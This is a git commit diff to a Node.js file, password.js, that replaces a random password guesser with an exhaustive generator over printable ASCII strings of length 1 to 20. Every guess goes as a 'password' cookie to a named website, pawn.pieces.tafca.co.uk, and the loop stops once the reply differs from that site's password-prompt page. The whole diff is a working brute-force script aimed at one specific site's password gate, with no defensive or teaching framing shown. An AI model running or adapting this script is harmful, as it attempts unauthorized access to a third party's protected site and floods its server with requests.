7a53eeddc5b871d2f4702335abe862b1d844c8cd
NoobKilla5412 <brandoncarlrobertson@gmail.com>
2024-03-20 13:05:44 -0700

    Update

--- password.js
+++ password.js
@@ -1,42 +1,31 @@
 const { log } = require("console");
+const Seqstring = require("seqstring");
 
 (async () => {
   const { default: fetch } = await import("node-fetch");
 
-  function generatePass(len) {
-    let pass = "";
-    let str = "ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "abcdefghijklmnopqrstuvwxyz0123456789@#$";
+  const letters = Array.from(Array(126 - 32 + 1), (_, i) => String.fromCharCode(i + 32));
+  log(letters);
 
-    for (let i = 1; i <= len; i++) {
-      let char = Math.floor(Math.random() * str.length + 1);
+  const generator = new Seqstring(1, 20, letters);
 
-      pass += str.charAt(char);
-    }
-
-    return pass;
-  }
-
-  main: for (let i = 0; i < 100; i++) {
-    for (let j = 0; j < 65 * (i + 3); j++) {
-      let pass = generatePass(i);
-      const text = await (
-        await fetch("https://pawn.pieces.tafca.co.uk", {
-          headers: {
-            cookie: `password=${pass}`
-          }
-        })
-      ).text();
-      if (
-        text !=
-        `<script>
+  for (const pass of generator) {
+    const text = await (
+      await fetch("https://pawn.pieces.tafca.co.uk", {
+        headers: {
+          cookie: `password=${pass}`
+        }
+      })
+    ).text();
+    if (
+      text !=
+      `<script>
     document.cookie = \`password=\${prompt('Enter the password')}\`;
     location.reload();
 </script>`
-      ) {
-        console.log(pass);
-        break main;
-      }
+    ) {
+      console.log(pass);
+      break;
     }
-    log(i + 1);
   }
 })();
